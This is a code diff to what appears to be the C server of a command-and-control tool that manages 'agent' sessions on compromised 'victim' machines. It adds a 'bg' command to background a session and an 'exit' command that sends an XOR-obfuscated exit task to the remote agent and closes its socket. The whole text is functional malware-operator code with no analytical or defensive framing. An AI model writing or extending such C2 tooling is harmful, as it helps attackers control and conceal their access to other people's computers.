@@ -44,7 +44,7 @@ int server_control_session(){
                 printf("Invalid id!\n\n");
             } else {
                 printf("[+] Entering agent control session with session ID: %d...\n", selected_id);
-                printf("Type \"exit\" to background agent control session\n");
+                printf("Type \"bg\" to background agent control session\n");
                 selected_id += 3;
                 return selected_id;
             }
@@ -147,15 +147,42 @@ void *Socket_Writer()
     {
 	
 
-        if (strcmp(newline_terminator(buffer), "exit\n") == 0 || strcmp(newline_terminator(buffer), "!exit\n\n") == 0) { //Find a way
-            printf("Exiting session...\n");
+        if (strcmp(newline_terminator(buffer), "bg\n") == 0) {
+	    
+            printf("Backgrounding session...\n");
             a.kill = 1;
             return NULL;
-        } else {
+        } 
+	else if(strcmp(newline_terminator(buffer), "exit\n") == 0){
+	
+	    printf("[+] Tasking agent with exit\n");	
+	    char* xorbuffer = XOR(buffer, key, n, keylen);
+	    write(a.dest, xorbuffer, n);
+
+	    for(int i = 0; i < max_clients; i++){
+	    	if(client_socket[i] == a.dest){
+			close(client_socket[i]);
+
+			victim_count--;
+			client_socket[i] = 0;
+			printf("[+] Control session: %d successfully exited.\n", a.dest - 3);
+		}
+				
+		else if(i == max_clients){
+			printf("[-] Could not find socket to close.\n");
+		}
+	    }
+
+	    free(xorbuffer);
+	    a.kill = 1;
+	    return NULL;
+	}
+	else {
 	
 	    char* xorbuffer = XOR(buffer, key, n, keylen);
 
             write(a.dest, xorbuffer, n); // writes to victim file descriptor. clientfd is passed to a.dest on line 12
+	    free(xorbuffer);
         }
     }
 
